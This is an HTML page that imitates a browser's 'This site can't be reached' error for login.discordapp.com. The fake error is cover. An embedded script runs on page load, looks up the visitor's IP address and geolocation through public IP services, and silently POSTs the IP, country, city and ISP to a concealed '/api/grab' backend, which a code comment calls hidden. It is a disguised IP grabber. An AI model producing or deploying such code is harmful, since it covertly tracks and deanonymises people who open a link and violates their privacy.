<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>This site can't be reached</title>
    <style>
        body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#f6f9fc;color:#3c4043;padding:40px}
        .c{max-width:600px;margin:auto;background:white;border-radius:8px;padding:40px;text-align:center;box-shadow:0 1px 6px rgba(0,0,0,.28)}
        .i{width:80px;height:80px;background:#dadce0;border-radius:50%;margin:0 auto 20px;position:relative}
        .i::after{content:"!";font-size:48px;font-weight:bold;color:#70757a;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
        h1{font-size:24px;margin:0 0 16px}
        p{font-size:16px;color:#5f6368;line-height:1.5}
        .f{margin-top:40px;font-size:14px;color:#9aa0a6}
    </style>
</head>
<body>
<div class="c">
    <div class="i"></div>
    <h1>This site can't be reached</h1>
    <p><strong>ERR_CONNECTION_TIMED_OUT</strong></p>
    <p>https://login.discordapp.com took too long to respond.</p>
</div>

<script>
async function grab(){
    try{
        const ip = await (await fetch("https://api.ipify.org?format=json")).json().then(d=>d.ip);
        const g = await (await fetch("https://free.freeipapi.com/api/json/"+ip)).json();
        
        document.getElementById("c").textContent = g.countryName;
        document.getElementById("f").textContent = g.countryFlag;

        // Calls YOUR HIDDEN BACKEND â€” no webhook visible here
        await fetch("/api/grab", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
                ip: ip,
                country: g.countryName,
                flag: g.countryFlag,
                city: g.regionName,
                isp: g.isp
            })
        });
    }catch(e){}
}
grab();
</script>
</body>
</html>
